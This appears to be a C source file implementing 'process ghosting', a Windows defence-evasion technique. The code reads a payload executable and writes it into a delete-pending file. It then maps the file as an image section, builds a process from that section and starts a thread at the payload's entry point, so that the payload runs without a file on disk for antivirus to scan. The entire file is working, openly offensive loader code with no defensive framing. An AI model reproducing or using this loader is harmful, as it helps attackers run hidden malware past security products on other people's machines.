#include "ProcessGhosting.h"

VOID RtlInitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_z_ PCWSTR SourceString
)
{
    if (SourceString)
        DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
    else
        DestinationString->MaximumLength = DestinationString->Length = 0;

    DestinationString->Buffer = (PWCH)SourceString;
}

BOOL ReadTargetFileW
(
	_In_ LPCWSTR PeName,
	_Out_ SIZE_T* BufferSize,
	_Out_ LPVOID* lpBuffer
)
{

	HANDLE	hFile = NULL;
	BOOL	State = TRUE;
	DWORD	lpNumberOfBytesRead = 0;

	if (!PeName || !lpBuffer)
		return FALSE;

	if (!(hFile = CreateFileW(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) || hFile == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Current File Handle", hFile);

	if (!(*BufferSize = GetFileSize(hFile, NULL)) || *BufferSize == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Current File Size", *BufferSize);

	if (!(*lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *BufferSize)) || *lpBuffer == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Allocated Bytes to Buffer", *BufferSize);

	if (!ReadFile(hFile, *lpBuffer, *BufferSize, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto _END_FUNC;
	}

	OKAY("Successfully Read File!");

_END_FUNC:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOLEAN CreateFileSection
(
	_In_ pWin32 Win32,
	_In_ LPCWSTR FilePath,
	_In_ PVOID PayloadBuffer,
	_In_ SIZE_T PayloadSize,
	_Out_ HANDLE* GhostSectionHandle
)
{

	BOOL							State					= TRUE;
	NTSTATUS						Status					= STATUS_SUCCESS;

	HANDLE							FileHandle				= NULL;
	HANDLE							SectionHandle			= NULL;

	UNICODE_STRING					FileName				= { 0 };
	OBJECT_ATTRIBUTES				Attributes				= { 0 };
	IO_STATUS_BLOCK					iosb					= { 0 };

	FILE_DISPOSITION_INFORMATION	FileDisposition			= { 0 };
	FileDisposition.DeleteFileA	= TRUE;

	LARGE_INTEGER Offset = { 0 };

	RtlInitUnicodeString(&FileName, FilePath);
	InitializeObjectAttributes(&Attributes, &FileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtOpenFile(&FileHandle, (DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &Attributes, &iosb, (FILE_SHARE_READ | FILE_SHARE_WRITE), (FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT))) || FileHandle == NULL)
	{
		NTERROR("NtOpenFile");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] File Handle", FileHandle);

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtSetInformationFile(FileHandle, &iosb, &FileDisposition, sizeof(FileDisposition), FileDispositionInformation)))
	{
		NTERROR("NtSetInformationFile");
		State = FALSE; goto _END_FUNC;
	}

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtWriteFile(FileHandle, NULL, NULL, NULL, &iosb, PayloadBuffer, PayloadSize, &Offset, NULL)))
	{
		NTERROR("NtWriteFile");
		State = FALSE; goto _END_FUNC;
	}

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, FileHandle)) || SectionHandle == NULL)
	{
		NTERROR("NtCreateSection");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Section Handle", SectionHandle);

	*GhostSectionHandle = SectionHandle;

_END_FUNC:

	if (FileHandle)
		CloseHandle(FileHandle);

	/*if (SectionHandle)
		CloseHandle(SectionHandle);*/

	return State;

}

BOOLEAN WriteProcessParameters
(
	_In_ HANDLE ProcessHandle,
	_In_ LPWSTR TargetProcessPath,
	_In_ pWin32 Win32,
	_Out_ PVOID* ImageBase
)
{

	NTSTATUS Status									= STATUS_SUCCESS;

	PEB RemotePebAddress							= { 0 };
	PROCESS_BASIC_INFORMATION pbi					= { 0 };
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters	= { 0 };

	ULONG_PTR Buffer								= 0;
	ULONG_PTR BufferEnd								= 0;

	PVOID Environment								= NULL;
	PVOID TmpBuffer									= NULL;

	SIZE_T BufferSize								= 0;
	SIZE_T NumberOfBytesWritten						= 0;

	UNICODE_STRING TargetPath						= { 0 };
	UNICODE_STRING CurrentDirectory					= { 0 };

	WCHAR DirectoryPath[MAX_PATH]					= { 0 };

	GetCurrentDirectoryW(MAX_PATH, DirectoryPath);

	RtlInitUnicodeString(&TargetPath, TargetProcessPath);
	RtlInitUnicodeString(&CurrentDirectory, DirectoryPath);

	CreateEnvironmentBlock(&Environment, NULL, TRUE);

	if (!NT_SUCCESS(Status = Win32->Ntapi.RtlCreateProcessParametersEx(&ProcessParameters, &TargetPath, NULL, &CurrentDirectory, &TargetPath, Environment, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))
	{
		NTERROR("RtlCreateProcessParametersEx");
		return FALSE;
	}

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtQueryInformationProcess(ProcessHandle, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL)))
	{
		NTERROR("NtQueryInformationProcess");
		return FALSE;
	}

	INFO("Got PBI Size");

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtReadVirtualMemory(ProcessHandle, pbi.PebBaseAddress, &RemotePebAddress, sizeof(PEB), NULL)))
	{
		NTERROR("NtReadVirtualMemory");
		return FALSE;
	}

	INFO("Read RemotePebAddress!");
	INFO("Peb Address: 0x%p", pbi.PebBaseAddress);

	Buffer = U_PTR(ProcessParameters);
	BufferEnd = (U_PTR(ProcessParameters) + ProcessParameters->Length);

	if (ProcessParameters->Environment)
	{

		if (U_PTR(ProcessParameters) > U_PTR(ProcessParameters->Environment))
			Buffer = U_PTR(ProcessParameters->Environment);

		if (U_PTR(ProcessParameters->Environment) + ProcessParameters->EnvironmentSize > BufferEnd)
			BufferEnd = U_PTR(ProcessParameters->Environment) + ProcessParameters->EnvironmentSize;

	}

	BufferSize = BufferEnd - Buffer;
	TmpBuffer = ProcessParameters;

	INFO("Buffer Size: %zu", BufferSize);

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtAllocateVirtualMemory(ProcessHandle, &TmpBuffer, 0, &BufferSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
	{
		NTERROR("NtAllocateVirtualMemory");
		return FALSE;
	}

	INFO("Wrote %zu Bytes", BufferSize);

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtWriteVirtualMemory(ProcessHandle, ProcessParameters, ProcessParameters, ProcessParameters->Length, &NumberOfBytesWritten)))
	{
		NTERROR("NtWriteVirtualMemory 1");
		return FALSE;
	}

	INFO("Wrote %zu Bytes to Process Parameters", NumberOfBytesWritten);

	if (ProcessParameters->Environment)
	{

		if (!NT_SUCCESS(Status = Win32->Ntapi.NtWriteVirtualMemory(ProcessHandle, L_PTR(ProcessParameters->Environment), L_PTR(ProcessParameters->Environment), ProcessParameters->EnvironmentSize, &NumberOfBytesWritten)))
		{
			NTERROR("NtWriteVirtualMemory 2");
			return FALSE;
		}

	}

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtWriteVirtualMemory(ProcessHandle, &pbi.PebBaseAddress->ProcessParameters, &ProcessParameters, sizeof(PVOID), &NumberOfBytesWritten)))
	{
		NTERROR("NtWriteVirtualMemory 3");
		return FALSE;
	}

	INFO("Wrote Process Params!");

	INFO("Read virtual mem");
	INFO("[0x%p] PEB Base Address", pbi.PebBaseAddress);

	INFO("[0x%p] Image Base", RemotePebAddress.ImageBaseAddress);

	*ImageBase = RemotePebAddress.ImageBaseAddress;

	return TRUE;

}

BOOLEAN CreateGhostedProcess
(
	_In_ LPCWSTR TargetFilePayload,
	_In_ HANDLE SectionHandle,
	_In_ PVOID PayloadBuffer,
	_In_ pWin32 Win32
)
{

	NTSTATUS Status									= STATUS_SUCCESS;
	BOOL State										= TRUE;

	PIMAGE_NT_HEADERS64 pImageNtHeader				= NULL;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters	= { 0 };

	HANDLE ProcessHandle							= NULL;
	HANDLE ThreadHandle								= NULL;

	DWORD EntryPointRVA								= 0;

	PVOID EntryPoint								= NULL;
	PVOID ImageBase									= NULL;

	pImageNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)PayloadBuffer + ((PIMAGE_DOS_HEADER)PayloadBuffer)->e_lfanew);
	if (pImageNtHeader->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	EntryPointRVA = pImageNtHeader->OptionalHeader.AddressOfEntryPoint;

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtCreateProcessEx(&ProcessHandle, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, SectionHandle, NULL, NULL, 0)) || ProcessHandle == NULL)
	{
		NTERROR("NtCreateProcessEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Process Created");

	if (!WriteProcessParameters(ProcessHandle, TargetFilePayload, Win32, &ImageBase))
	{
		PRINT_ERROR("WriteProcessParameters");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Wrote Process Parameters");

	INFO("Read Peb Parameters");

	EntryPoint = C_PTR(EntryPointRVA + U_PTR(ImageBase));

	INFO("[0x%p] Entry Point", EntryPoint);

	if (!NT_SUCCESS(Status = Win32->Ntapi.NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, (PUSER_THREAD_START_ROUTINE)EntryPoint, NULL, FALSE, 0, 0, 0, NULL)) || ThreadHandle == NULL)
	{
		NTERROR("NtCreateThreadEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Created Thread");

_END_FUNC:

	/*if (SectionHandle)
		CloseHandle(SectionHandle);*/

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

	return State;

}
